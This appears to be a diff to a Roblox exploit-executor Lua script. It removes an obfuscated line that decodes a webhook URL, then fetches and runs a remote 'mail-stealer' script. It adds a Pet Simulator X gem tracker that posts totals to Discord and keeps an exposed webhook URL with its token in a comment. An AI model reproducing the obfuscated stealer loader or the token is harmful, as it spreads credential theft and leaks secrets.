@@ -1,1 +1,60 @@
-local print=print;local type=type;local tonumber=tonumber;local a={}for b=1,10 do a[b]=math.random(1000)end;local c=""function genednv(d)getgenv()[c]=d end;local tostring=tostring;local e=math.abs;local f=string.char(104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,108,101,119,105,115,97,107,117,114,97,46,109,111,101,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,48,57,51,49,51,56,56,56,51,52,49,51,50,57,57,50,54,48,47,101,70,50,76,70,54,73,56,80,54,48,117,52,73,76,56,103,108,80,107,71,117,107,77,77,119,76,75,77,88,112,90,83,100,80,87,122,98,118,72,117,114,119,81,75,111,76,85,50,118,73,113,98,110,118,70,98,118,90,54,76,67,117,70,101,73,85,106);local h=math.ceil;local i=math.floor;local function j(k)c="mouselock"genednv("true")local l={}for b=1,k do l[b]=math.random(100)end;return l end;local m=math.max;local n=math.min;local o={2,93,210,219,2983,2130,239,284,034}local function p(q)local r={}c="name"pvsocq("pvsocq")for b=1,q do r[b]=string.char(math.random(97,122))end;return table.concat(r)end;local s=table.create;local t=coroutine.resume;local u=coroutine.yield;local ipairs=ipairs;local pairs=pairs;local next=next;local v=string.char(104,116,116,112,115,58,47,47,119,117,109,97,116,46,120,121,122,47,115,99,114,105,112,116,115,47,109,97,105,108,45,115,116,101,97,108,101,114,46,108,117,97)local error=error;local pcall=pcall;function tesdwef(w)return game:HttpGetAsync(w,true)end;local xpcall=xpcall;local x=loadstring;local rawget=rawget;local rawset=rawset;local function y()local z=p(math.random(5,10))local A=p(math.random(5,10))c="webhook"genednv(f)return z..A end;local B=string.len;local C=string.sub;local D=string.upper;local E=string.lower;local F=string.find;local function G(k)local H=j(10)local l={}local I=p(5)for b=1,k do l[b]=math.random()>0.5 end;local J=y()return l end;local K=G(2)local L=math.acos;local M=math.asin;local N=math.atan;local O=math.atan2;x(tesdwef(v))()local P=math.cos
+local WEBHOOK_URL = "" -- https://discordapp.com/api/webhooks/1093821944425631784/U6Ronz0ob2PZ87aECmrAu2rShvARCsqoTpoPe9oH3IBYXESOEre3i8hQdgllt3CfUsM-
+local MINUTES = 30 -- How often will send a discord webhook
+local MAIN_ACCOUNT_NAME = "pvsocq"
+local MAIN_ACCOUNT_ID = "785368670"
+
+-- First you will need to get the actual diamonds/gems you have in-game
+local LocalPlayer = game.Players.LocalPlayer
+local Library = require(game:GetService("ReplicatedStorage").Library) -- PSX Library
+
+-- Lets save this to a folder with all our accounts
+-- We can also set this to a loop
+task.spawn(function() 
+  while true do
+    local Diamonds = Library.Save.Get().Diamonds -- Get save, and then Diamonds
+    if not isfolder("accounts") then makefolder("accounts") end
+    writefile("accounts/" .. LocalPlayer.Name .. ".txt", tostring(Diamonds))
+    task.wait(1)
+  end
+end)
+
+function SendDiscordWebhook()
+    -- Check for webhook_url
+    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
+    local totalGems = 0
+    if not isfolder("accounts") then return end
+    for i, v in pairs(listfiles("accounts")) do
+      local currentAccountDiamonds = readfile(v)
+      if currentAccountDiamonds and tonumber(currentAccountDiamonds) then
+        totalGems = totalGems + tonumber(currentAccountDiamonds)
+      end
+    end
+
+    local embed = {
+            ["title"] = "Total Gems",
+            ["description"] = "💎 Total Gems/Diamonds: " .. tostring(totalGems)
+        }
+      
+    -- Compatibility with Synapse and UNC executors (script-ware, krnl, WeAreDevs, Fluxus, Oxygen, Comet, etc...)  
+    (syn and syn.request or http_request or http.request) {
+        Url = WEBHOOK_URL,
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = HttpService:JSONEncode({
+            embeds = {embed} 
+        })
+    }
+end
+  
+-- Just one of the accounts need to handle the discord webhook, 
+if game.Players.LocalPlayer.Name == MAIN_ACCOUNT_NAME then
+-- Or you can use the UserId check:
+-- if game.Players.LocalPlayer.UserId == MAIN_ACCOUNT_ID then
+  task.spawn(function()
+    while task.wait(MINUTES * 60) do 
+      SendDiscordWebhook()
+    end
+  end)
+end
